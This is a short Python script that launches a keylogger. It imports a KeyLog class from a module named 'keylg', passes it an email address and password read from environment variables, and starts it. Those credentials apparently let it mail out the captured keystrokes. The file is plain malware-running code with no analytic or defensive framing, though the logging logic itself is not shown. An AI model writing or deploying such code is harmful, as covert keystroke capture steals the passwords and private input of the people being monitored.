from keylg import KeyLog
import os
mail = os.getenv("MAIL_ID")
password = os.getenv("PASS")
k=KeyLog(mail,password)
k.start()